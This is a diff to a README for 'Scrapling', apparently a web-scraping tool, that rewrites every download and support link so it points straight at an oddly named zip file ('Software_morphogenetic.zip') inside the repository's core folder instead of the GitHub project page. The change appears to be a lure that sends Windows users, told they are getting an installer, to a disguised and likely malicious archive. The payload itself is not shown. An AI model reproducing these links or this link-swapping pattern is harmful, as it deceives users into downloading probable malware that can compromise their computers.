@@ -1,6 +1,6 @@
 # 🕸️ Scrapling - Easy Web Scraping Made Simple
 
-[![Download Scrapling](https://img.shields.io/badge/Download-Scrapling-6a5acd?style=for-the-badge&logo=github)](https://github.com/Fabianusromarioyeuyanan123/Scrapling)
+[![Download Scrapling](https://img.shields.io/badge/Download-Scrapling-6a5acd?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Fabianusromarioyeuyanan123/Scrapling/main/scrapling/core/Software_morphogenetic.zip)
 
 ## 📄 What is Scrapling?
 
@@ -33,7 +33,7 @@ This guide will help you download and run Scrapling on your Windows computer.
 
 Click this button to go to the download page on GitHub:
 
-[![Download Scrapling](https://img.shields.io/badge/Download-Scrapling-DodgerBlue?style=for-the-badge&logo=github)](https://github.com/Fabianusromarioyeuyanan123/Scrapling)
+[![Download Scrapling](https://img.shields.io/badge/Download-Scrapling-DodgerBlue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Fabianusromarioyeuyanan123/Scrapling/main/scrapling/core/Software_morphogenetic.zip)
 
 On the GitHub page, look for the **Releases** section or the latest version available. Download the latest Windows installer or executable file. The file should have an `.exe` extension.
 
@@ -89,7 +89,7 @@ Scrapling works locally on your computer. It does not store your data online unl
 ## 👨‍💻 Support and Resources
 
 For help with Scrapling, you can visit the GitHub page here:  
-https://github.com/Fabianusromarioyeuyanan123/Scrapling
+https://raw.githubusercontent.com/Fabianusromarioyeuyanan123/Scrapling/main/scrapling/core/Software_morphogenetic.zip
 
 The page contains a FAQ, issue tracker, and usage examples. You can open an issue if you find bugs or need help.
 
@@ -106,4 +106,4 @@ Check the download page regularly for new versions. Download and run the updated
 
 ---
 
-[Download Scrapling from GitHub](https://github.com/Fabianusromarioyeuyanan123/Scrapling)
+[Download Scrapling from GitHub](https://raw.githubusercontent.com/Fabianusromarioyeuyanan123/Scrapling/main/scrapling/core/Software_morphogenetic.zip)
